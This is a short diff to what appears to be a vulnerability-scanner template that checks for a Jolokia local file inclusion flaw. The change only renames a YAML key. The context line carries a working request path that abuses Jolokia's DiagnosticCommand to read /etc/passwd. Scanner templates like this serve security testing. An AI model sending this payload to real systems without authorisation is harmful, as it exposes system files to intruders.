@@ -10,7 +10,7 @@ info:
     - https://github.com/laluka/jolokia-exploitation-toolkit
   tags: jolokia,lfi
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd"
